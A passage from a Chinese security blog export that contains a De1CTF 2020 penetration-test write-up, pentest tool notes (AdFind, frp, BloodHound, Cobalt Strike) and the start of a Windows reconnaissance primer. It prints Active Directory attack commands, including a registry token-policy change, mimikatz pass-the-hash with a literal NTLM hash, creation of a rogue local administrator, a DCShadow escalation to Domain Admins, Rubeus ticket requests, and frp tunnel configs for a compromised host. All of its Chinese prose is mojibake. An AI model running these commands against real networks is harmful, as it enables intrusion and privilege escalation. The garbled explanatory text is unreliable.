<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f </span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä¹‹åå°è¯•å†…ç½‘ç©¿é€ï¼Œç”¨frpæŒ‚ä¸Šä»£ç†ï¼Œç„¶åï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œå¥½åƒæœ¬åœ°è§£æä¸äº†dmï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509143858857.png" alt="image-20200509143858857"></p>
<p>ç„¶åå°±æ²¡åŠæ³•å¤ç°ä¸‹å»äº†ï¼Œæœ‰å¸ˆå‚…åšå‡ºæ¥çš„å¯ä»¥è¯„è®ºå‘Šè¯‰æˆ‘è¿™ä¸ªèœé¸¡ï¼Œæˆ‘å“ªé‡Œé™¤äº†é—®é¢˜ï¼Œå¤ªèœäº†ã€‚</p>
<p>ä¹‹åå‚è€ƒäº†n1ntyå¤§ä½¬(<a href="https://mp.weixin.qq.com/s/gw1EIMnXQ9tCZLkdvKdzAg)[æ–‡ç« ](https://paper.seebug.org/620/#s4u-service-for-user)" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gw1EIMnXQ9tCZLkdvKdzAg)[æ–‡ç« ](https://paper.seebug.org/620/#s4u-service-for-user)</a></p>
<blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509193504323.png" alt="image-20200509193504323"></p>
</blockquote>
<p>ç„¶ååœ¨æˆ‘çš„è™šæ‹Ÿæœº/etc/hosts æ·»åŠ äº† 192.168.0.12 dm ,ç„¶è€Œå¹¶æ²¡æœ‰è§£å†³é—®é¢˜ï¼Œä¹‹åå°±å¼€å§‹æœç´¢proxychains dnsè§£æçš„ä¸œè¥¿ï¼Œæ˜¯proxyresolvï¼Œå¼€å§‹å®ƒæ˜¯è¿™æ ·çš„</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509193855651.png" alt="image-20200509193855651"></p>
<p>çœ‹ä¸Šé¢ä¹‹æ‰€ä»¥å¤±è´¥å°±æ˜¯è¿™é‡Œçš„4.2.2.2ä¸èƒ½è§£ædm,ç„¶åæˆ‘ä»¬éœ€è¦è§£ædmä¸º192.168.0.12ï¼Œè¿™é‡Œå›¾ç®€å•ç„¶åå°±æ— è„‘åœ°è®©ç¨‹åºè¾“å‡º192.168.0.12å°±å¯ä»¥äº†ï¼Œï¼Œï¼Œï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509194940263.png" alt="image-20200509194940263"></p>
<p>ç„¶åè¿˜æ˜¯ä¹‹å‰çš„ä¸€å¥—æµç¨‹ï¼Œç”¨wmiexec.pyè¿˜æ˜¯ä¸æˆåŠŸï¼Œç„¶åè¯•äº†è¯•smbexec.pyï¼Œç„¶åå°±å¯ä»¥äº†ï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509195542165.png" alt="image-20200509195542165"></p>
<p>ä¹‹åé€€å‡ºè¿‡ä¸€å›ï¼Œåœ¨ç”¨smbexec.pyå°±æŠ¥é”™äº†ï¼Œä»€ä¹ˆæœåŠ¡å·²å­˜åœ¨ï¼Œç„¶åå°±åªèƒ½ç”¨acexec.pyæ¥æ‰§è¡Œå•æ¡å‘½ä»¤äº†ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªåé—¨æ‰§è¡Œååœ¨cså¾—åˆ°ä¸€ä¸ªsystemæƒé™çš„shellã€‚</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509200703281.png" alt="image-20200509200703281"></p>
<p>è¿›è¡ŒDCShadowæ”»å‡»éœ€è¦æ‰“å¼€ä¸¤ä¸ªmimikatzçª—å£ï¼Œç„¶åå¼€å¯è¿œç¨‹æ¡Œé¢ï¼ˆä¹Ÿå¯ä»¥ä¸å¼€è¿œç¨‹æ¡Œé¢ï¼Œå¯ä»¥å‚è€ƒå‡ºé¢˜äºº<a href="https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest" target="_blank" rel="noopener">åšå®¢</a>ï¼‰ï¼Œè¿™é‡Œåˆ©ç”¨<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a>è¿›è¡Œä»£ç†ï¼Œfrpä½¿ç”¨è¯·çœ‹å¦ä¸€ç¯‡æ–‡ç« ï¼Œä»£ç†è®¾ç½®å¥½ä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™ç¯‡æ–‡ç« æåˆ°çš„<a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">Pass the Hash with Remote Desktop</a>åˆ©ç”¨ntlmç›´æ¥ç™»å½•è¿œç¨‹æ¡Œé¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:DM &#x2F;ntlm:cf3c7280c8c3d3fcce24e9e7289ddd10 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506151539110.png" alt="image-20200506151539110"></p>
<blockquote>
<p>Restricted Admin modeï¼Œç›´è¯‘ä¸ºå—é™ç®¡ç†æ¨¡å¼ï¼Œä¸»è¦åŠŸèƒ½æ˜¯ä½¿å¾—å‡­æ®ä¸ä¼šæš´éœ²åœ¨ç›®æ ‡ç³»ç»Ÿä¸­</p>
<h3 id="é€‚ç”¨ç³»ç»Ÿ"><a href="#é€‚ç”¨ç³»ç»Ÿ" class="headerlink" title="é€‚ç”¨ç³»ç»Ÿ"></a>é€‚ç”¨ç³»ç»Ÿ</h3><ul>
<li>Windows 8.1å’ŒWindows Server 2012 R2é»˜è®¤æ”¯æŒè¯¥åŠŸèƒ½</li>
<li>Windows 7å’ŒWindows Server 2008 R2é»˜è®¤ä¸æ”¯æŒï¼Œéœ€è¦å®‰è£…è¡¥ä¸2871997ã€2973351</li>
</ul>
</blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509201856781.png" alt="image-20200509201856781"></p>
<p>è¿œç¨‹æ¡Œé¢æ‰“ä¸å¼€ï¼Œç„¶åæ–°å»ºä¸€ä¸ªç”¨æˆ·ï¼Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user username password /add #æ·»åŠ ç”¨æˆ·</span><br><span class="line">net user 123 123 /add</span><br><span class="line">net user username #æŸ¥çœ‹ç”¨æˆ·çš„è¯¦æƒ…</span><br><span class="line">net user 123</span><br><span class="line">net localgroup group username /add #å°†ç”¨æˆ·æ·»åŠ åˆ°groupä¸­</span><br><span class="line">net localgroup administrators 123 /add</span><br></pre></td></tr></table></figure>

<p>ç„¶åmstsc.exeï¼Œç›´æ¥è¾“å…¥è´¦å·å¯†ç è¿æ¥ï¼Œç¬¬ä¸€æ¬¡æ‹¿åˆ°åˆ«äººçš„è¿œç¨‹æ¡Œé¢ï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509203945376.png" alt="image-20200509203945376"></p>
<p>ç„¶åå°±æ˜¯DCShadowï¼Œä»¥ç®¡ç†å‘˜æ‰“å¼€ä¸€ä¸ªmimikatz.exeï¼Œç„¶åè¾“å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!+</span><br><span class="line">!processtoken</span><br><span class="line">lsadump::dcshadow &#x2F;object:CN&#x3D;De1ta,CN&#x3D;Users,DC&#x3D;De1CTF2020,DC&#x3D;lab &#x2F;attribute:primaryGroupID &#x2F;value:512</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨ä»¥de1taç”¨æˆ·çš„èº«ä»½ï¼Œpushæ¨é€ï¼Œè¯•äº†åŠå¤©å°±æ˜¯æ²¡æˆåŠŸã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt &#x2F;user:de1ta &#x2F;rc4:B03094996601324646AC223BF30D0D07 &#x2F;domain:de1ctf2020.lab &#x2F;ptt &amp;&amp; mimikatz.exe &quot;lsadump::dcshadow &#x2F;push&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨Coblt Strikeä¸­ä¹Ÿæ²¡æˆåŠŸï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œ</p>
<p>æŠ¥é”™å¦‚ä¸‹</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509225941467.png" alt="image-20200509225941467"></p>
<p>æŸ¥äº†æŠ¥é”™ä¹Ÿéƒ½æ˜¯è¯´æ˜¯å› ä¸ºç¬¬ä¸€æ­¥æ²¡æœ‰ç”¨systemæƒé™æ‰“å¼€mimikatz,exeï¼Œæ˜¯ç”¨systemæ‰“å¼€çš„å•Šã€‚ğŸ˜µğŸ˜µğŸ˜µ</p>
<p>å‚è€ƒ</p>
<p><a href="https://mp.weixin.qq.com/s/1CR0up_b5a1zw02wZNwJpg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1CR0up_b5a1zw02wZNwJpg</a></p>
<p><a href="https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest" target="_blank" rel="noopener">https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest</a></p>
<p>[<a href="https://xz.aliyun.com/t/7454]" target="_blank" rel="noopener">https://xz.aliyun.com/t/7454]</a>(</p>
]]></content>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¸—é€å·¥å…·ä½¿ç”¨</title>
    <url>/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>è®°å½•ä¸€äº›æ¸—é€å·¥å…·çš„ä½¿ç”¨ï¼ŒæŒç»­æ›´æ–°</p>
<a id="more"></a>

<h2 id="1-åˆ©ç”¨adfind-è¿‡æ»¤-ACL"><a href="#1-åˆ©ç”¨adfind-è¿‡æ»¤-ACL" class="headerlink" title="1. åˆ©ç”¨adfind è¿‡æ»¤ ACL"></a><strong>1. åˆ©ç”¨adfind è¿‡æ»¤ ACL</strong></h2><p>å¦‚æœæƒ³ç”¨adfind è¿‡æ»¤ACLçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>-sddlfilter</code>,è¯­æ³•å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-sddlfilter ;;;;;</span><br></pre></td></tr></table></figure>

<p>åé¢è·Ÿçš„å‚æ•°å¯¹åº”çš„æ˜¯aceæ¡ç›®ç›¸åº”çš„å‚æ•°ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿‡æ»¤çš„æ ¼å¼è·Ÿè¾“å‡ºçš„æ ¼å¼è¦ä¿æŒä¸€è‡´ã€‚</p>
<p>å¦‚æœ<code>-rawsddl</code> ï¼Œæœ€åä¸€ä¸ªå‚æ•°æ˜¯sidï¼Œè¿™ä¸ªæ—¶å€™ç”¨<code>-sddlfilter</code>è¿›è¡Œè¿‡æ»¤ï¼Œæœ€åä¸€ä¸ªå‚æ•°å°±è¦ç”¨sidçš„å½¢å¼ã€‚</p>
<p>å¦‚æœæ˜¯<code>-sddl+++</code>ï¼Œæœ€åä¸€ä¸ªå‚æ•°å·²ç»è§£æåè´¦å·åï¼Œè¿™ä¸ªæ—¶å€™ç”¨<code>-sddlfilter</code>è¿›è¡Œè¿‡æ»¤ï¼Œæœ€åä¸€ä¸ªå‚æ•°å°±è¦ç”¨è´¦å·åçš„å½¢å¼ã€‚</p>
<p>ä¸‹é¢ä¸¾å‡ ä¸ªä¾‹å­</p>
<ol>
<li><p>æŸ¥æ‰¾æŸä¸ªå¯¹è±¡åœ¨åŸŸå†…çš„ACLæƒé™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b &quot;DC&#x3D;test,DC&#x3D;local&quot; nTSecurityDescriptor   -sddl+++   -sddlfilter ;;;;;&quot;TEST\DC2016$&quot;   -recmute</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t01820587bbe037011c.png" alt="img"></p>
<ol>
<li>æŸ¥æ‰¾æ›´æ”¹ä¸€ä¸ªå¯¹è±¡çš„é©¬ä¸Šåˆ°ï¼S-AllowedToActOnBehalfOfOtherIdentityçš„æƒé™</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b &quot;DC&#x3D;test,DC&#x3D;local&quot; nTSecurityDescriptor   -sddl++   -sddlfilter ;;;&quot;msDS-AllowedToActOnBehalfOfOtherIdentity&quot;;;  -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t01c5d2427249c7cca8.png" alt="img"></p>
<ol>
<li>æŸ¥æ‰¾åŸŸå†…å…·å¤‡dcync æƒé™çš„ç”¨æˆ·</li>
</ol>
<p>å¯¹åŸŸå¯¹è±¡åªéœ€è¦å…·å¤‡ä¸€ä¸‹è¿™ä¸¤ä¸ªæƒé™ï¼Œå°±æœ‰dcsyncçš„æƒé™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;DS-Replication-Get-Changes&#39;     &#x3D; 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line">&#39;DS-Replication-Get-Changes-All&#39; &#x3D; 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t0190b4f7118459c867.png" alt="img"></p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t01783c2e12d6384581.png" alt="img"></p>
<p>å¼€å§‹è¿›è¡Œæœç´¢</p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t011c3a109eabb651d5.png" alt="img"></p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t015d193bee48b235f1.png" alt="img"></p>
<h1 id="2-frp-å†…ç½‘ä»£ç†"><a href="#2-frp-å†…ç½‘ä»£ç†" class="headerlink" title="2 frp å†…ç½‘ä»£ç†"></a>2 frp å†…ç½‘ä»£ç†</h1><p>frps è¿è¡Œåœ¨å…·æœ‰å…¬ç½‘IPåœ°å€çš„VPSä¸Š</p>
<p>frpc è¿è¡Œåœ¨æˆ‘ä»¬å¾—åˆ°shellæƒé™çš„è‚‰é¸¡ä¸Š</p>
<p>frps  é…ç½®æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line"># IP ä¸ bind_addr é»˜è®¤ç›¸åŒï¼Œå¯ä»¥ä¸è®¾ç½®</span><br><span class="line"># dashboard_addr &#x3D; 0.0.0.0</span><br><span class="line"># ç«¯å£å¿…é¡»è®¾ç½®ï¼Œåªæœ‰è®¾ç½®webé¡µé¢æ‰ç”Ÿæ•ˆ</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line"># ç”¨æˆ·å¯†ç ä¿å¹³å®‰</span><br><span class="line">dashboard_user &#x3D; aaaa</span><br><span class="line">dashboard_pwd &#x3D; bbbb</span><br><span class="line"></span><br><span class="line"># å…è®¸å®¢æˆ·ç«¯ç»‘å®šçš„ç«¯å£</span><br><span class="line">allow_ports &#x3D; 40000-50000</span><br></pre></td></tr></table></figure>

<p>frpc é…ç½®æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># è¿œç¨‹VPSåœ°å€</span><br><span class="line">server_addr &#x3D; xxx.xx.xx.xx</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 44444</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; abc</span><br><span class="line">plugin_passwd &#x3D; abc</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯è¿è¡Œ</p>
<img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200506151014647.png" alt="image-20200506151014647" style="zoom:200%;">

<p>ä¸Šå›¾å®¢æˆ·ç«¯ä¸ºwin2012R2</p>
<p>æœåŠ¡ç«¯è¿è¡Œ</p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509191519398.png" alt="image-20200509191519398"></p>
<p>ä¸Šé¢ç¬¬ä¸‰è¡Œè¡¨ç¤ºå·²ç»å»ºç«‹ä»£ç†</p>
<p>ä¹‹ååœ¨æœ¬åœ°ç”¨proxifierå°±å¯ä»¥ä»£ç†è®¿é—®å†…ç½‘èµ„æº</p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200506151223032.png" alt="image-20200506151223032"></p>
<h1 id="3-BloodHound"><a href="#3-BloodHound" class="headerlink" title="3.BloodHound"></a>3.BloodHound</h1><p><a href="https://github.com/BloodHoundAD/BloodHound/wiki" target="_blank" rel="noopener">é¡¹ç›®åœ°å€</a></p>
<p>éœ€è¦javaç¯å¢ƒï¼Œå®‰è£…neo4jæ•°æ®åº“ï¼Œæˆ‘æ˜¯é€‰æ‹©åœ¨kaliè™šæ‹Ÿæœºå®‰è£…neo4jæ•°æ®åº“ï¼Œç„¶åå†ä¸»æœºwin10ä½¿ç”¨bloodhound,è¦ä¿®æ”¹kalié‡Œçš„æ•°æ®åº“é…ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dbms.default_listen_address&#x3D;0.0.0.0</span><br><span class="line">dbms.default_advertised_address&#x3D;0.0.0.0</span><br><span class="line">dbms.connector.bolt.listen_address&#x3D;0.0.0.0:7687</span><br><span class="line">dbms.connector.http.listen_address&#x3D;0.0.0.0:7474</span><br></pre></td></tr></table></figure>

<p>winç›´æ¥å®‰è£… <a href="https://github.com/BloodHoundAD/BloodHound/releases" target="_blank" rel="noopener">bloodhound</a></p>
<p>é…å¥—ä½¿ç”¨<a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" rel="noopener">SharpHound.exe</a>ï¼Œåœ¨ç›®æ ‡ä¸»æœºè¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509161842148.png" alt="image-20200509161842148"></p>
<p>ç„¶åä¸‹è½½zipï¼ŒæŠŠjsonæ–‡ä»¶æ‹–è¿›bloodhound</p>
<ul>
<li>database info </li>
</ul>
<img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509162917174.png" alt="image-20200509162917174" style="zoom:150%;">

<ul>
<li>nodeinfo</li>
</ul>
<img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509163204823.png" alt="image-20200509163204823" style="zoom:150%;">

<ul>
<li>queries</li>
</ul>
<p>å¯¹åº”ä¸‹é¢</p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509164243314.png" alt="image-20200509164243314"></p>
<h4 id="ç¤ºä¾‹ï¼šShortest-Paths-from-Kerberoastable-Users"><a href="#ç¤ºä¾‹ï¼šShortest-Paths-from-Kerberoastable-Users" class="headerlink" title="ç¤ºä¾‹ï¼šShortest Paths from Kerberoastable Users"></a>ç¤ºä¾‹ï¼šShortest Paths from Kerberoastable Users</h4><p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509165304258.png" alt="image-20200509165304258"></p>
<p>å¦‚æœä¸€ä¸ªç”¨æˆ·æ˜¯Kerberoastableï¼Œå¯ä»¥é€šè¿‡Kerberoastingçš„åˆ°hashï¼Œç„¶åå¯ä»¥çˆ†ç ´å¯†ç ã€‚</p>
<p>ps:æ³¨å†Œspnçš„æœåŠ¡è´¦å·éƒ½æ˜¯Kerberoastableçš„ã€‚</p>
<p>ps:å³é”®è·¯å¾„å¯ä»¥å¾—åˆ°ç›¸å…³æ»¥ç”¨ä¿¡æ¯ä»¥åŠå‚è€ƒï¼Œå¦‚ä¸Šé¢è¿™ä¸ªåœ¨Abuseé‡Œæä¾›äº†åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾åˆ©ç”¨æ–¹æ³•ã€‚</p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509165843365.png" alt="image-20200509165843365"></p>
<h1 id="4-cobalt-strike"><a href="#4-cobalt-strike" class="headerlink" title="4 cobalt strike"></a>4 cobalt strike</h1><p>æ‰§è¡Œpowermadæˆ–powerpiewï¼Œç”¨powershell-import,ç„¶åå†ç”¨powerpick  XXX.</p>
<p>sleep 0 é€Ÿåº¦ä¼šå¿«ï¼Œä½†æ˜¯å®æˆ˜ä¸­æµé‡ä¼šå¤§ã€‚</p>
<p>å‚è€ƒ</p>
<p><a href="https://xz.aliyun.com/t/7311" target="_blank" rel="noopener">https://xz.aliyun.com/t/7311</a></p>
<p><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/12#0x02-acl" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/ldap-pian/12#0x02-acl</a></p>
]]></content>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>å†…ç½‘æ¸—é€ä¿¡æ¯æ”¶é›†</title>
    <url>/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>de1tactfé‡åˆ°äº†æ¸—é€é¢˜ï¼Œè®°å½•ä¸‹ä¿¡æ¯æ”¶é›†çš„å‘½ä»¤ï¼Œ</p>
<a id="more"></a>

<h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><h2 id="windowså¸¸ç”¨ç”¨æˆ·"><a href="#windowså¸¸ç”¨ç”¨æˆ·" class="headerlink" title="windowså¸¸ç”¨ç”¨æˆ·"></a>windowså¸¸ç”¨ç”¨æˆ·</h2><blockquote>
<ul>
<li>SYSTEMï¼šæœ¬åœ°æœºå™¨ä¸Šæ‹¥æœ‰æœ€é«˜æƒé™çš„ç”¨æˆ·ã€‚</li>
<li>Administratorï¼šæœ¬åœ°æœºå™¨ä¸Šæ‹¥æœ‰æœ€é«˜æƒé™çš„ç”¨æˆ·ã€‚</li>
<li>Guestï¼šåªæ‹¥æœ‰ç›¸å¯¹è¾ƒå°‘çš„æƒé™ï¼Œé»˜è®¤è¢«ç¦ç”¨ã€‚</li>
</ul>
</blockquote>
<h2 id="windowså¸¸è§ç”¨æˆ·ç»„"><a href="#windowså¸¸è§ç”¨æˆ·ç»„" class="headerlink" title="windowså¸¸è§ç”¨æˆ·ç»„"></a>windowså¸¸è§ç”¨æˆ·ç»„</h2><blockquote>
<p>Administrators,ç®¡ç†å‘˜ç»„ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒAdministratorsä¸­çš„ç”¨æˆ·å¯¹è®¡ç®—æœº/åŸŸæœ‰ä¸å—é™åˆ¶çš„å®Œå…¨è®¿é—®æƒã€‚åˆ†é…ç»™è¯¥ç»„çš„é»˜è®¤æƒé™å…è®¸å¯¹æ•´ä¸ªç³»ç»Ÿè¿›è¡Œå®Œå…¨æ§åˆ¶ã€‚æ‰€ä»¥ï¼Œåªæœ‰å—ä¿¡ä»»çš„äººå‘˜æ‰å¯æˆä¸ºè¯¥ç»„çš„æˆå‘˜ã€‚</p>
<p>Power Usersï¼Œé«˜çº§ç”¨æˆ·ç»„ï¼ŒPower Users å¯ä»¥æ‰§è¡Œé™¤äº†ä¸º Administrators ç»„ä¿ç•™çš„ä»»åŠ¡å¤–çš„å…¶ä»–ä»»ä½•æ“ä½œç³»ç»Ÿä»»åŠ¡ã€‚åˆ†é…ç»™ Power Users ç»„çš„é»˜è®¤æƒé™å…è®¸ Power Users ç»„çš„æˆå‘˜ä¿®æ”¹æ•´ä¸ªè®¡ç®—æœºçš„è®¾ç½®ã€‚ä½†Power Users ä¸å…·æœ‰å°†è‡ªå·±æ·»åŠ åˆ° Administrators ç»„çš„æƒé™ã€‚åœ¨æƒé™è®¾ç½®ä¸­ï¼Œè¿™ä¸ªç»„çš„æƒé™æ˜¯ä»…æ¬¡äºAdministratorsçš„ã€‚</p>
<p>Users:æ™®é€šç”¨æˆ·ç»„ï¼Œè¿™ä¸ªç»„çš„ç”¨æˆ·æ— æ³•è¿›è¡Œæœ‰æ„æˆ–æ— æ„çš„æ”¹åŠ¨ã€‚å› æ­¤ï¼Œç”¨æˆ·å¯ä»¥è¿è¡Œç»è¿‡éªŒè¯çš„åº”ç”¨ç¨‹åºï¼Œä½†ä¸å¯ä»¥è¿è¡Œå¤§å¤šæ•°æ—§ç‰ˆåº”ç”¨ç¨‹åºã€‚Users ç»„æ˜¯æœ€å®‰å…¨çš„ç»„ï¼Œå› ä¸ºåˆ†é…ç»™è¯¥ç»„çš„é»˜è®¤æƒé™ä¸å…è®¸æˆå‘˜ä¿®æ”¹æ“ä½œç³»ç»Ÿçš„è®¾ç½®æˆ–ç”¨æˆ·èµ„æ–™ã€‚Users ç»„æä¾›äº†ä¸€ä¸ªæœ€å®‰å…¨çš„ç¨‹åºè¿è¡Œç¯å¢ƒã€‚åœ¨ç»è¿‡ NTFS æ ¼å¼åŒ–çš„å·ä¸Šï¼Œé»˜è®¤å®‰å…¨è®¾ç½®æ—¨åœ¨ç¦æ­¢è¯¥ç»„çš„æˆå‘˜å±åŠæ“ä½œç³»ç»Ÿå’Œå·²å®‰è£…ç¨‹åºçš„å®Œæ•´æ€§ã€‚ç”¨æˆ·ä¸èƒ½ä¿®æ”¹ç³»ç»Ÿæ³¨å†Œè¡¨è®¾ç½®ã€æ“ä½œç³»ç»Ÿæ–‡ä»¶æˆ–ç¨‹åºæ–‡ä»¶ã€‚Users å¯ä»¥å…³é—­å·¥ä½œç«™ï¼Œä½†ä¸èƒ½å…³é—­æœåŠ¡å™¨ã€‚Users å¯ä»¥åˆ›å»ºæœ¬åœ°ç»„ï¼Œä½†åªèƒ½ä¿®æ”¹è‡ªå·±åˆ›å»ºçš„æœ¬åœ°ç»„ã€‚</p>
<p>Guests:æ¥å®¾ç»„ï¼ŒæŒ‰é»˜è®¤å€¼ï¼Œæ¥å®¾è·Ÿæ™®é€šUsersçš„æˆå‘˜æœ‰åŒç­‰è®¿é—®æƒï¼Œä½†æ¥å®¾å¸æˆ·çš„é™åˆ¶æ›´å¤šã€‚</p>
<p>Everyone:é¡¾åæ€ä¹‰ï¼Œæ‰€æœ‰çš„ç”¨æˆ·ï¼Œè¿™ä¸ªè®¡ç®—æœºä¸Šçš„æ‰€æœ‰ç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚</p>
</blockquote>
<h2 id="windows-æ–‡ä»¶å¤¹æƒé™"><a href="#windows-æ–‡ä»¶å¤¹æƒé™" class="headerlink" title="windows æ–‡ä»¶å¤¹æƒé™"></a>windows æ–‡ä»¶å¤¹æƒé™</h2><blockquote>
<p>â‘ å®Œå…¨æ§åˆ¶ï¼ˆFull Controlï¼‰ï¼š è¯¥æƒé™å…è®¸ç”¨æˆ·å¯¹æ–‡ä»¶å¤¹ã€å­æ–‡ä»¶å¤¹ã€æ–‡ä»¶è¿›è¡Œå…¨æƒæ§åˆ¶ï¼Œå¦‚ä¿®æ”¹èµ„æºçš„æƒé™ã€è·å–èµ„æºçš„æ‰€æœ‰è€…ã€åˆ é™¤èµ„æºçš„æƒé™ç­‰ï¼Œæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™å°±ç­‰äºæ‹¥æœ‰äº†å…¶ä»–æ‰€æœ‰çš„æƒé™ï¼›</p>
<p>â‘¡ä¿®æ”¹ï¼ˆModifyï¼‰ï¼š è¯¥æƒé™å…è®¸ç”¨æˆ·ä¿®æ”¹æˆ–åˆ é™¤èµ„æºï¼ŒåŒæ—¶è®©ç”¨æˆ·æ‹¥æœ‰å†™å…¥åŠè¯»å–å’Œè¿è¡Œæƒé™ï¼›</p>
